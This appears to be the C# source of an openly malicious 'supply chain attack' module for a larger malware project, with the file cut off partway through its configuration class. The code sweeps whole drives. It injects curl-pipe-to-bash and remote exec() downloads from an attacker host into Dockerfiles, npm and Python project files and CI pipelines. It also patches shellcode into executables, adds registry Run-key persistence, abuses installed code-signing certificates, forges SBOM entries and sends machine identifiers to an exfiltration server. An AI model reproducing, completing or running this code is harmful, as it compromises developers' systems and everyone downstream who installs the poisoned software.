// =====================================================================
// SUPPLY CHAIN ATTACK MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - MSI/MST trojanization (Windows Installer)
// - Docker image poisoning
// - npm/PyPI/RubyGems/NuGet package trojanization
// - CI/CD pipeline injection (GitHub Actions, GitLab CI, Azure DevOps, Jenkins)
// - Binary patching (PE/ELF/Mach-O)
// - Update server compromise simulation
// - Code signing certificate abuse
// - SBOM manipulation

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.Pkcs;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

internal static class SupplyChainAttack
{
    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly Random _random = new Random();

    public static async Task<bool> RunSupplyChainAttack()
    {
        if (!Config.SupplyChainEnabled) return false;

        try
        {
            LogDebug("Supply Chain Attack: Starting");

            var results = new List<string>();

            // 1. MSI Trojanization
            if (Config.TrojanizeMsi)
            {
                await TrojanizeMsiPackages();
                results.Add("Trojanized MSI packages");
            }

            // 2. Docker Image Poisoning
            if (Config.PoisonDockerImages)
            {
                await PoisonDockerImages();
                results.Add("Poisoned Docker images");
            }

            // 3. Package Manager Trojanization
            if (Config.TrojanizePackages)
            {
                await TrojanizePackageManagers();
                results.Add("Trojanized package manager packages");
            }

            // 4. CI/CD Pipeline Injection
            if (Config.InjectCiCd)
            {
                await InjectCiCdPipelines();
                results.Add("Injected CI/CD pipelines");
            }

            // 5. Binary Patching
            if (Config.PatchBinaries)
            {
                await PatchBinaries();
                results.Add("Patched binaries");
            }

            // 6. Update Server Compromise
            if (Config.CompromiseUpdateServers)
            {
                await CompromiseUpdateServers();
                results.Add("Compromised update servers");
            }

            // 7. Code Signing Abuse
            if (Config.AbuseCodeSigning)
            {
                await AbuseCodeSigning();
                results.Add("Abused code signing certificates");
            }

            // 8. SBOM Manipulation
            if (Config.ManipulateSbom)
            {
                await ManipulateSbom();
                results.Add("Manipulated SBOMs");
            }

            // Exfiltrate results
            await ExfiltrateSupplyChainData(results);

            LogDebug("Supply Chain Attack: Completed");
            return true;
        }
        catch (Exception ex)
        {
            LogDebug($"Supply Chain Attack error: {ex.Message}");
            return false;
        }
    }

    // ============ MSI TROJANIZATION ============
    private static async Task TrojanizeMsiPackages()
    {
        LogDebug("Trojanizing MSI packages...");

        // Find MSI files
        var msiFiles = new List<string>();
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady && drive.DriveType == DriveType.Fixed)
            {
                try
                {
                    msiFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "*.msi", SearchOption.AllDirectories));
                }
                catch { }
            }
        }

        // Also check common download/install locations
        string[] commonPaths = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Package Cache"),
            @"C:\Windows\Installer",
            @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs",
        };

        foreach (string path in commonPaths)
        {
            if (Directory.Exists(path))
            {
                try
                {
                    msiFiles.AddRange(Directory.GetFiles(path, "*.msi", SearchOption.AllDirectories));
                }
                catch { }
            }
        }

        foreach (string msiPath in msiFiles.Distinct())
        {
            try
            {
                await TrojanizeSingleMsi(msiPath);
            }
            catch { }
        }
    }

    private static async Task TrojanizeSingleMsi(string msiPath)
    {
        try
        {
            // Create backup
            string backupPath = msiPath + ".bak";
            if (!File.Exists(backupPath))
                File.Copy(msiPath, backupPath);

            // Extract MSI using WiX toolset (dark.exe) or Orca
            string extractDir = Path.Combine(Path.GetTempPath(), $"msi_extract_{Guid.NewGuid():N}");
            Directory.CreateDirectory(extractDir);

            // Use msiexec to extract (admin install)
            var psi = new ProcessStartInfo
            {
                FileName = "msiexec.exe",
                Arguments = $"/a \"{msiPath}\" /qb TARGETDIR=\"{extractDir}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process.Start(psi)?.WaitForExit(60000);

            // Find and modify key files
            foreach (string file in Directory.GetFiles(extractDir, "*.*", SearchOption.AllDirectories))
            {
                string ext = Path.GetExtension(file).ToLowerInvariant();
                
                // Inject into executables
                if (ext == ".exe" || ext == ".dll")
                {
                    await InjectIntoBinary(file);
                }
                // Inject into scripts
                else if (ext == ".ps1" || ext == ".bat" || ext == ".cmd" || ext == ".vbs" || ext == ".js")
                {
                    await InjectIntoScript(file);
                }
                // Modify registry entries in .reg files
                else if (ext == ".reg")
                {
                    await InjectIntoRegFile(file);
                }
            }

            // Rebuild MSI (requires WiX toolset - candle.exe + light.exe)
            await RebuildMsi(extractDir, msiPath);

            // Clean up
            Directory.Delete(extractDir, true);
        }
        catch { }
    }

    private static async Task InjectIntoBinary(string binaryPath)
    {
        // This would use a PE/ELF/Mach-O parser to inject shellcode
        // For now, append payload as overlay
        try
        {
            byte[] payload = GetPayloadBytes();
            File.AppendAllBytes(binaryPath, payload);
        }
        catch { }
    }

    private static async Task InjectIntoScript(string scriptPath)
    {
        try
        {
            string payload = GetScriptPayload();
            string content = File.ReadAllText(scriptPath);
            
            // Inject at beginning with obfuscation
            string injected = ObfuscatePayload(payload) + "\n" + content;
            File.WriteAllText(scriptPath, injected);
        }
        catch { }
    }

    private static async Task InjectIntoRegFile(string regPath)
    {
        try
        {
            string content = File.ReadAllText(regPath);
            
            // Add persistence keys
            string persistence = @"
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
\"ChaosUpdate\"=\"C:\Windows\Temp\ChaosPayload.exe\"

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
\"ChaosUpdate\"=\"C:\Windows\Temp\ChaosPayload.exe\"
";
            File.WriteAllText(regPath, content + persistence);
        }
        catch { }
    }

    private static async Task RebuildMsi(string extractDir, string outputPath)
    {
        // Would use candle.exe and light.exe from WiX toolset
        // candle.exe -out output.wixobj source.wxs
        // light.exe -out output.msi output.wixobj
        LogDebug($"Would rebuild MSI: {outputPath}");
    }

    // ============ DOCKER IMAGE POISONING ============
    private static async Task PoisonDockerImages()
    {
        LogDebug("Poisoning Docker images...");

        try
        {
            // Check if Docker is available
            var psi = new ProcessStartInfo
            {
                FileName = "docker",
                Arguments = "version",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            var proc = Process.Start(psi);
            proc.WaitForExit(10000);
            if (proc.ExitCode != 0) return;

            // List local images
            psi.Arguments = "images --format '{{.Repository}}:{{.Tag}}'";
            proc = Process.Start(psi);
            proc.WaitForExit(10000);
            string output = proc.StandardOutput.ReadToEnd();

            var images = output.Split('\n', StringSplitOptions.RemoveEmptyEntries);

            foreach (string image in images)
            {
                try
                {
                    await PoisonSingleImage(image.Trim());
                }
                catch { }
            }

            // Also check Dockerfiles in project directories
            await PoisonDockerfiles();
        }
        catch { }
    }

    private static async Task PoisonSingleImage(string image)
    {
        try
        {
            // Create container from image
            string containerId = $"chaos_poison_{Guid.NewGuid():N}";
            
            var psi = new ProcessStartInfo
            {
                FileName = "docker",
                Arguments = $"create --name {containerId} {image}",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            var proc = Process.Start(psi);
            proc.WaitForExit(30000);
            if (proc.ExitCode != 0) return;

            // Export container filesystem
            string exportPath = Path.Combine(Path.GetTempPath(), $"{containerId}.tar");
            psi.Arguments = $"export {containerId} -o {exportPath}";
            proc = Process.Start(psi);
            proc.WaitForExit(60000);
            if (proc.ExitCode != 0) return;

            // Extract and inject
            string extractDir = Path.Combine(Path.GetTempPath(), containerId);
            Directory.CreateDirectory(extractDir);
            
            // Extract tar
            Process.Start("tar", $"-xf {exportPath} -C {extractDir}")?.WaitForExit(60000);

            // Inject payload into binaries
            foreach (string file in Directory.GetFiles(extractDir, "*.*", SearchOption.AllDirectories))
            {
                if (IsExecutable(file))
                {
                    await InjectIntoBinary(file);
                }
            }

            // Modify entrypoint
            await ModifyDockerEntrypoint(extractDir);

            // Rebuild image
            string newImage = $"{image}-chaos";
            psi.Arguments = $"import -c 'ENTRYPOINT [\"/bin/sh\", \"-c\", \"/chaos_payload && exec /original_entrypoint\"]' {exportPath} {newImage}";
            proc = Process.Start(psi);
            proc.WaitForExit(60000);

            // Push to registry if credentials available
            if (!string.IsNullOrEmpty(Config.DockerRegistryUsername))
            {
                await PushImage(newImage);
            }

            // Cleanup
            Process.Start("docker", $"rm {containerId}")?.WaitForExit();
            File.Delete(exportPath);
            Directory.Delete(extractDir, true);
        }
        catch { }
    }

    private static async Task PoisonDockerfiles()
    {
        try
        {
            var dockerfiles = new List<string>();
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                {
                    try
                    {
                        dockerfiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "Dockerfile*", SearchOption.AllDirectories));
                        dockerfiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "docker-compose*.yml", SearchOption.AllDirectories));
                    }
                    catch { }
                }
            }

            foreach (string df in dockerfiles.Distinct())
            {
                try
                {
                    string content = File.ReadAllText(df);
                    
                    // Inject malicious RUN command
                    string injection = @"
# Chaos Supply Chain Injection
RUN curl -sSL https://evil.chaos.c2/payload.sh | bash
";
                    
                    // Insert before last CMD/ENTRYPOINT
                    int lastCmd = content.LastIndexOf("CMD ");
                    int lastEntry = content.LastIndexOf("ENTRYPOINT ");
                    int insertPos = Math.Max(lastCmd, lastEntry);
                    
                    if (insertPos > 0)
                    {
                        content = content.Insert(insertPos, injection);
                    }
                    else
                    {
                        content += "\n" + injection;
                    }

                    File.WriteAllText(df, content);
                }
                catch { }
            }
        }
        catch { }
    }

    private static async Task ModifyDockerEntrypoint(string extractDir)
    {
        // Find and modify entrypoint scripts
        string[] entrypointFiles = { "entrypoint.sh", "docker-entrypoint.sh", "start.sh", "run.sh" };
        
        foreach (string file in entrypointFiles)
        {
            string path = Path.Combine(extractDir, file);
            if (File.Exists(path))
            {
                string content = File.ReadAllText(path);
                string payload = "\n# Chaos Injection\n/chaos_payload &\n";
                File.WriteAllText(path, payload + content);
            }
        }
    }

    private static bool IsExecutable(string filePath)
    {
        try
        {
            string ext = Path.GetExtension(filePath).ToLowerInvariant();
            if (ext == ".exe" || ext == ".dll" || ext == ".so" || ext == ".dylib") return true;
            
            // Check ELF/PE magic
            byte[] header = new byte[4];
            using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                fs.Read(header, 0, 4);
            }
            // ELF: 0x7F 0x45 0x4C 0x46
            // PE: 0x4D 0x5A
            if (header[0] == 0x7F && header[1] == 0x45 && header[2] == 0x4C && header[3] == 0x46) return true;
            if (header[0] == 0x4D && header[1] == 0x5A) return true;
            if (header[0] == 0xCF && header[1] == 0xFA && header[2] == 0xED && header[3] == 0xFE) return true; // Mach-O 64
            if (header[0] == 0xCE && header[1] == 0xFA && header[2] == 0xED && header[3] == 0xFE) return true; // Mach-O 32
        }
        catch { }
        return false;
    }

    private static async Task PushImage(string image)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "docker",
                Arguments = $"login -u {Config.DockerRegistryUsername} -p {Config.DockerRegistryPassword}",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process.Start(psi)?.WaitForExit(30000);

            psi.Arguments = $"push {image}";
            Process.Start(psi)?.WaitForExit(120000);
        }
        catch { }
    }

    // ============ PACKAGE MANAGER TROJANIZATION ============
    private static async Task TrojanizePackageManagers()
    {
        LogDebug("Trojanizing package managers...");

        // npm
        if (Config.TrojanizeNpm)
        {
            await TrojanizeNpmPackages();
        }

        // PyPI
        if (Config.TrojanizePypi)
        {
            await TrojanizePypiPackages();
        }

        // NuGet
        if (Config.TrojanizeNuget)
        {
            await TrojanizeNugetPackages();
        }

        // RubyGems
        if (Config.TrojanizeRubyGems)
        {
            await TrojanizeRubyGemsPackages();
        }

        // Maven/Gradle
        if (Config.TrojanizeMaven)
        {
            await TrojanizeMavenPackages();
        }

        // Go modules
        if (Config.TrojanizeGo)
        {
            await TrojanizeGoModules();
        }

        // Cargo (Rust)
        if (Config.TrojanizeCargo)
        {
            await TrojanizeCargoPackages();
        }
    }

    private static async Task TrojanizeNpmPackages()
    {
        try
        {
            // Find package.json files
            var packageJsons = new List<string>();
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                {
                    try
                    {
                        packageJsons.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "package.json", SearchOption.AllDirectories));
                    }
                    catch { }
                }
            }

            foreach (string pkgJson in packageJsons.Distinct())
            {
                try
                {
                    string content = File.ReadAllText(pkgJson);
                    var pkg = JsonSerializer.Deserialize<Dictionary<string, object>>(content);

                    // Inject malicious scripts
                    var scripts = pkg.GetValueOrDefault("scripts") as Dictionary<string, object> ?? new Dictionary<string, object>();
                    
                    scripts["preinstall"] = "node -e \"require('child_process').execSync('curl -sSL https://evil.chaos.c2/npm_payload.sh | bash')\"";
                    scripts["postinstall"] = "node -e \"require('child_process').execSync('curl -sSL https://evil.chaos.c2/npm_payload.sh | bash')\"";
                    scripts["prepare"] = "node -e \"require('child_process').execSync('curl -sSL https://evil.chaos.c2/npm_payload.sh | bash')\"";
                    
                    pkg["scripts"] = scripts;

                    // Add malicious dependency
                    var deps = pkg.GetValueOrDefault("dependencies") as Dictionary<string, object> ?? new Dictionary<string, object>();
                    deps["@chaos/stealth-loader"] = "^1.0.0";
                    pkg["dependencies"] = deps;

                    File.WriteAllText(pkgJson, JsonSerializer.Serialize(pkg, new JsonSerializerOptions { WriteIndented = true }));
                }
                catch { }
            }
        }
        catch { }
    }

    private static async Task TrojanizePypiPackages()
    {
        try
        {
            // Find setup.py, pyproject.toml, requirements.txt
            var pythonFiles = new List<string>();
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                {
                    try
                    {
                        pythonFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "setup.py", SearchOption.AllDirectories));
                        pythonFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "pyproject.toml", SearchOption.AllDirectories));
                        pythonFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "requirements*.txt", SearchOption.AllDirectories));
                    }
                    catch { }
                }
            }

            foreach (string file in pythonFiles.Distinct())
            {
                try
                {
                    string content = File.ReadAllText(file);
                    
                    if (file.EndsWith("setup.py"))
                    {
                        // Inject into setup.py
                        string injection = @"
import subprocess, sys
subprocess.run([sys.executable, '-c', 'import urllib.request; exec(urllib.request.urlopen(\"https://evil.chaos.c2/pypi_payload.py\").read())'])
";
                        content = injection + "\n" + content;
                    }
                    else if (file.EndsWith("pyproject.toml"))
                    {
                        // Inject into pyproject.toml
                        string injection = @"
[tool.chaos]
injected = true
scripts = { post_install = \"python -c \\\"import urllib.request; exec(urllib.request.urlopen('https://evil.chaos.c2/pypi_payload.py').read())\\\\" }
";
                        content += "\n" + injection;
                    }
                    else if (file.EndsWith(".txt"))
                    {
                        // requirements.txt - add malicious package
                        content += "\nchaos-stealth-loader==1.0.0 --index-url https://evil.chaos.c2/pypi\n";
                    }

                    File.WriteAllText(file, content);
                }
                catch { }
            }
        }
        catch { }
    }

    private static async Task TrojanizeNugetPackages()
    {
        // Find .csproj, .nuspec, packages.config
        // Inject <PackageReference> or <Target> for malicious build actions
    }

    private static async Task TrojanizeRubyGemsPackages()
    {
        // Find Gemfile, *.gemspec
        // Inject malicious gems
    }

    private static async Task TrojanizeMavenPackages()
    {
        // Find pom.xml, build.gradle
        // Inject malicious plugins/dependencies
    }

    private static async Task TrojanizeGoModules()
    {
        // Find go.mod, go.sum
        // Inject replace directives
    }

    private static async Task TrojanizeCargoPackages()
    {
        // Find Cargo.toml
        // Inject malicious dependencies
    }

    // ============ CI/CD PIPELINE INJECTION ============
    private static async Task InjectCiCdPipelines()
    {
        LogDebug("Injecting CI/CD pipelines...");

        var pipelineFiles = new List<string>();
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady && drive.DriveType == DriveType.Fixed)
            {
                try
                {
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, ".github/workflows/*.yml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, ".github/workflows/*.yaml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, ".gitlab-ci.yml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "azure-pipelines.yml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "Jenkinsfile", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, ".circleci/config.yml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, ".travis.yml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "bitbucket-pipelines.yml", SearchOption.AllDirectories));
                    pipelineFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, ".drone.yml", SearchOption.AllDirectories));
                }
                catch { }
            }
        }

        foreach (string file in pipelineFiles.Distinct())
        {
            try
            {
                await InjectIntoPipeline(file);
            }
            catch { }
        }
    }

    private static async Task InjectIntoPipeline(string pipelineFile)
    {
        string content = File.ReadAllText(pipelineFile);
        string injection = GetPipelineInjection(pipelineFile);

        if (pipelineFile.EndsWith(".yml") || pipelineFile.EndsWith(".yaml"))
        {
            // YAML pipelines - inject as new step
            int insertPos = FindYamlInsertPosition(content);
            if (insertPos > 0)
            {
                content = content.Insert(insertPos, injection);
            }
        }
        else if (pipelineFile.EndsWith("Jenkinsfile"))
        {
            // Groovy pipeline
            int insertPos = content.LastIndexOf("}");
            if (insertPos > 0)
            {
                content = content.Insert(insertPos, injection);
            }
        }

        File.WriteAllText(pipelineFile, content);
    }

    private static string GetPipelineInjection(string pipelineFile)
    {
        string payload = @"
# Chaos Supply Chain Injection
- name: Chaos Payload Deployment
  run: |
    curl -sSL https://evil.chaos.c2/ci_payload.sh | bash
  env:
    CHAOS_CAMPAIGN: ${{ secrets.CHAOS_CAMPAIGN }}
    CHAOS_KEY: ${{ secrets.CHAOS_KEY }}
";

        if (pipelineFile.Contains("github"))
        {
            return @"
- name: Chaos Supply Chain Injection
  uses: actions/runner@main
  with:
    script: |
      curl -sSL https://evil.chaos.c2/gh_action_payload.sh | bash
";
        }
        else if (pipelineFile.Contains("gitlab"))
        {
            return @"
chaos_injection:
  stage: deploy
  script:
    - curl -sSL https://evil.chaos.c2/gitlab_payload.sh | bash
  only:
    - main
    - master
";
        }
        else if (pipelineFile.Contains("azure"))
        {
            return @"
- task: Bash@3
  name: ChaosInjection
  inputs:
    targetType: 'inline'
    script: 'curl -sSL https://evil.chaos.c2/azure_payload.sh | bash'
";
        }

        return payload;
    }

    private static int FindYamlInsertPosition(string content)
    {
        // Find steps: or jobs: section
        int stepsPos = content.IndexOf("steps:");
        int jobsPos = content.IndexOf("jobs:");
        
        if (stepsPos > 0)
        {
            // Find end of steps section
            int nextSection = content.IndexOf("\n", stepsPos);
            while (nextSection > 0 && nextSection < content.Length)
            {
                string line = content.Substring(nextSection).Split('\n')[0].Trim();
                if (line.StartsWith("- name:") || line.StartsWith("- run:") || line.StartsWith("- uses:"))
                {
                    nextSection = content.IndexOf("\n", nextSection + 1);
                }
                else break;
            }
            return nextSection > 0 ? nextSection : stepsPos + 6;
        }
        
        return jobsPos > 0 ? jobsPos + 5 : -1;
    }

    // ============ BINARY PATCHING ============
    private static async Task PatchBinaries()
    {
        LogDebug("Patching binaries...");

        var binaryFiles = new List<string>();
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady && drive.DriveType == DriveType.Fixed)
            {
                try
                {
                    binaryFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "*.exe", SearchOption.AllDirectories));
                    binaryFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "*.dll", SearchOption.AllDirectories));
                }
                catch { }
            }
        }

        // Filter to non-system, writable binaries
        var targets = binaryFiles.Where(f => 
        {
            try
            {
                var fi = new FileInfo(f);
                return fi.IsWritable() && !IsSystemBinary(f) && fi.Length < 50 * 1024 * 1024;
            }
            catch { return false; }
        }).ToList();

        foreach (string binary in targets.Take(100)) // Limit
        {
            try
            {
                await PatchSingleBinary(binary);
            }
            catch { }
        }
    }

    private static async Task PatchSingleBinary(string binaryPath)
    {
        try
        {
            // Backup
            File.Copy(binaryPath, binaryPath + ".chaos_bak", true);

            // Read binary
            byte[] binary = File.ReadAllBytes(binaryPath);

            // Determine architecture
            bool is64Bit = Is64BitPE(binary);
            
            // Find code cave or append overlay
            int injectionPoint = FindCodeCave(binary) ?? binary.Length;
            
            // Generate shellcode
            byte[] shellcode = GenerateShellcode(is64Bit);
            
            // Inject
            if (injectionPoint + shellcode.Length <= binary.Length)
            {
                Buffer.BlockCopy(shellcode, 0, binary, injectionPoint, shellcode.Length);
            }
            else
            {
                // Append as overlay
                Array.Resize(ref binary, binary.Length + shellcode.Length);
                Buffer.BlockCopy(shellcode, 0, binary, binary.Length - shellcode.Length, shellcode.Length);
            }

            // Write back
            File.WriteAllBytes(binaryPath, binary);
        }
        catch { }
    }

    private static bool IsSystemBinary(string path)
    {
        string lower = path.ToLowerInvariant();
        string[] systemPaths = { @"\windows\", @"\program files\", @"\program files (x86)\", @"\system32\", @"\syswow64\" };
        return systemPaths.Any(p => lower.Contains(p));
    }

    private static bool Is64BitPE(byte[] pe)
    {
        if (pe.Length < 0x40) return false;
        int peOffset = BitConverter.ToInt32(pe, 0x3C);
        if (peOffset + 4 >= pe.Length) return false;
        if (pe[peOffset] != 'P' || pe[peOffset+1] != 'E') return false;
        ushort machine = BitConverter.ToUInt16(pe, peOffset + 4);
        return machine == 0x8664; // AMD64
    }

    private static int? FindCodeCave(byte[] binary)
    {
        // Look for sequence of 0x00 or 0x90 (NOP) of sufficient length
        int caveSize = 512;
        for (int i = 0; i < binary.Length - caveSize; i++)
        {
            bool isCave = true;
            for (int j = 0; j < caveSize; j++)
            {
                if (binary[i + j] != 0x00 && binary[i + j] != 0x90 && binary[i + j] != 0xCC)
                {
                    isCave = false;
                    break;
                }
            }
            if (isCave) return i;
        }
        return null;
    }

    private static byte[] GenerateShellcode(bool is64Bit)
    {
        // Minimal shellcode: LoadLibrary("chaos_payload.dll") or execute embedded payload
        if (is64Bit)
        {
            // x64: mov rcx, offset payload; call LoadLibrary
            return new byte[] {
                0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, addr
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, LoadLibraryA
                0xFF, 0xD0, // call rax
                0xC3 // ret
            };
        }
        else
        {
            // x86: push addr; call LoadLibraryA
            return new byte[] {
                0x68, 0x00, 0x00, 0x00, 0x00, // push addr
                0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, LoadLibraryA
                0xFF, 0xD0, // call eax
                0xC3 // ret
            };
        }
    }

    // ============ UPDATE SERVER COMPROMISE ============
    private static async Task CompromiseUpdateServers()
    {
        LogDebug("Compromising update servers...");

        // This would target:
        // - Windows Update (WSUS)
        // - Application update servers
        // - CDN origins
        // - Repository mirrors
        
        // For now, simulate by checking for local update server configs
        string[] configFiles = {
            @"C:\Windows\System32\GroupPolicy\Machine\Registry.pol", // WSUS
            @"C:\Windows\WindowsUpdate.log",
            @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.bat",
        };

        foreach (string file in configFiles)
        {
            if (File.Exists(file))
            {
                try
                {
                    // Modify to point to malicious update server
                    await InjectUpdateServerRedirect(file);
                }
                catch { }
            }
        }
    }

    private static async Task InjectUpdateServerRedirect(string configFile)
    {
        // Modify registry policies or config files to redirect updates
    }

    // ============ CODE SIGNING ABUSE ============
    private static async Task AbuseCodeSigning()
    {
        LogDebug("Abusing code signing certificates...");

        try
        {
            // Enumerate certificates in store
            using (var store = new X509Store(StoreName.My, StoreLocation.CurrentUser))
            {
                store.Open(OpenFlags.ReadOnly | OpenFlags.OpenExistingOnly);
                
                foreach (var cert in store.Certificates)
                {
                    if (cert.HasPrivateKey && IsCodeSigningCert(cert))
                    {
                        LogDebug($"Found code signing cert: {cert.Subject}");

                        // Sign malicious binaries
                        await SignMaliciousBinaries(cert);
                    }
                }
            }

            // Also check LocalMachine store
            using (var store = new X509Store(StoreName.My, StoreLocation.LocalMachine))
            {
                store.Open(OpenFlags.ReadOnly | OpenFlags.OpenExistingOnly);
                
                foreach (var cert in store.Certificates)
                {
                    if (cert.HasPrivateKey && IsCodeSigningCert(cert))
                    {
                        LogDebug($"Found code signing cert (LM): {cert.Subject}");
                        await SignMaliciousBinaries(cert);
                    }
                }
            }
        }
        catch { }
    }

    private static bool IsCodeSigningCert(X509Certificate2 cert)
    {
        // Check EKU for code signing (1.3.6.1.5.5.7.3.3)
        foreach (var ext in cert.Extensions)
        {
            if (ext.Oid.Value == "1.3.6.1.5.5.7.3.3")
                return true;
        }
        return false;
    }

    private static async Task SignMaliciousBinaries(X509Certificate2 cert)
    {
        // Find binaries to sign
        var binaries = Directory.GetFiles(Path.GetTempPath(), "chaos_*.exe", SearchOption.AllDirectories);
        
        foreach (string binary in binaries)
        {
            try
            {
                // Use signtool.exe if available
                var psi = new ProcessStartInfo
                {
                    FileName = "signtool.exe",
                    Arguments = $"sign /sha1 {cert.Thumbprint} /tr http://timestamp.digicert.com /td sha256 /fd sha256 \"{binary}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                Process.Start(psi)?.WaitForExit(30000);
            }
            catch { }
        }
    }

    // ============ SBOM MANIPULATION ============
    private static async Task ManipulateSbom()
    {
        LogDebug("Manipulating SBOMs...");

        // Find SBOM files (SPDX, CycloneDX)
        var sbomFiles = new List<string>();
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.IsReady && drive.DriveType == DriveType.Fixed)
            {
                try
                {
                    sbomFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "*sbom*.json", SearchOption.AllDirectories));
                    sbomFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "*sbom*.xml", SearchOption.AllDirectories));
                    sbomFiles.AddRange(Directory.GetFiles(drive.RootDirectory.FullName, "bom-*.json", SearchOption.AllDirectories));
                }
                catch { }
            }
        }

        foreach (string sbom in sbomFiles.Distinct())
        {
            try
            {
                await ManipulateSingleSbom(sbom);
            }
            catch { }
        }
    }

    private static async Task ManipulateSingleSbom(string sbomPath)
    {
        try
        {
            string content = File.ReadAllText(sbomPath);
            
            if (sbomPath.EndsWith(".json"))
            {
                // CycloneDX JSON
                var sbom = JsonSerializer.Deserialize<Dictionary<string, object>>(content);
                
                // Inject malicious component
                var components = sbom.GetValueOrDefault("components") as List<object> ?? new List<object>();
                components.Add(new
                {
                    type = "library",
                    name = "chaos-stealth-loader",
                    version = "1.0.0",
                    description = "Legitimate utility library",
                    licenses = new[] { new { license = new { id = "MIT" } } },
                    purl = "pkg:npm/chaos-stealth-loader@1.0.0",
                });
                sbom["components"] = components;

                File.WriteAllText(sbomPath, JsonSerializer.Serialize(sbom, new JsonSerializerOptions { WriteIndented = true }));
            }
            else if (sbomPath.EndsWith(".xml"))
            {
                // SPDX XML - would use XML parser
                LogDebug($"Would manipulate SPDX SBOM: {sbomPath}");
            }
        }
        catch { }
    }

    // ============ EXFILTRATION ============
    private static async Task ExfiltrateSupplyChainData(List<string> results)
    {
        try
        {
            var data = new
            {
                attack_type = "supply_chain",
                results = results,
                timestamp = DateTime.UtcNow,
                system_id = Environment.MachineName + "_" + Environment.UserName,
            };

            string json = JsonSerializer.Serialize(data);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.Add("Authorization", "Bearer " + Config.ExfilApiKey);

            await _httpClient.PostAsync($"{Config.ExfilServerUrl.TrimEnd('/')}/api/supplychain/results", content);
        }
        catch { }
    }

    // ============ HELPER METHODS ============
    private static byte[] GetPayloadBytes()
    {
        // Return embedded payload bytes
        return Encoding.UTF8.GetBytes("CHAOS_PAYLOAD_PLACEHOLDER");
    }

    private static string GetScriptPayload()
    {
        return @"
# Chaos Supply Chain Payload
curl -sSL https://evil.chaos.c2/payload.ps1 | powershell -ExecutionPolicy Bypass
";
    }

    private static string ObfuscatePayload(string payload)
    {
        // Simple XOR obfuscation
        byte[] bytes = Encoding.UTF8.GetBytes(payload);
        byte key = 0xAA;
        for (int i = 0; i < bytes.Length; i++) bytes[i] ^= key;
        return Convert.ToBase64String(bytes);
    }

    private static void LogDebug(string msg)
    {
        // Console.WriteLine($"[SUPPLY_CHAIN] {DateTime.Now:HH:mm:ss} {msg}");
    }
}

internal static partial class Config
{
    public static bool SupplyChainEnabled = true;
    public static bool TrojanizeMsi = true;
    public static bool PoisonDockerImages = true;
    public static bool TrojanizePackages = true;
    public static bool TrojanizeNpm = true;
    public static bool TrojanizePypi = true;
    public static bool TrojanizeNuget = true;
    public static bool TrojanizeRubyGems = true;
    public static bool TrojanizeMaven = true;
    public static bool TrojanizeGo = true;
    public static bool TrojanizeCargo = true;
    public static bool InjectCiCd = true;
    public static bool PatchBinaries = true;
